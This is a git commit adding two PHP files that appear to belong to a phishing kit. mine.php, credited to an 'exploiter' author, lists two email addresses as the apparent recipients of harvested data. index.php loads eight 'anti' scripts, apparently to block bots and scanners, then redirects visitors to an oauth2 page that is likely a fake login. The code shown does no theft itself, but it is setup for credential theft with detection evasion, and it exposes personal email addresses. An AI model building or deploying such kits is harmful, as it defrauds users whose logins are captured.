f0f4520e27e8f6779b282fc6a97ced9a284bcc12
rhino350 <47240873+rhino350@users.noreply.github.com>
2019-02-01 02:11:46 -0800

    Add files via upload

---
+++ extra/mine.php
@@ -0,0 +1,21 @@
+<?php
+	/*
+	/ -> All Created By IK4 BLA3E
+	/ -> https://www.youtube.com/user/FireInfoOfficiel
+	/ -> https://www.facebook.com/Officiel.Exploiter
+	*/
+	
+
+	// ================================= //
+
+	$yours = "panther46@yandex.com, bnhq300@gmail.com";
+
+	// ================================= //
+
+
+	function now() {
+		date_default_timezone_set('GMT');
+		return date("d/m/Y H:i:s");
+	}
+
+?>
---
+++ index.php
@@ -0,0 +1,12 @@
+<?php
+	require 'prevents/anti1.php';
+	require 'prevents/anti2.php';
+	require 'prevents/anti3.php';
+	require 'prevents/anti4.php';
+	require 'prevents/anti5.php';
+	require 'prevents/anti6.php';
+	require 'prevents/anti7.php';
+	require 'prevents/anti8.php';
+	session_start();
+	exit(header("Location: oauth2/index.php"));
+?>
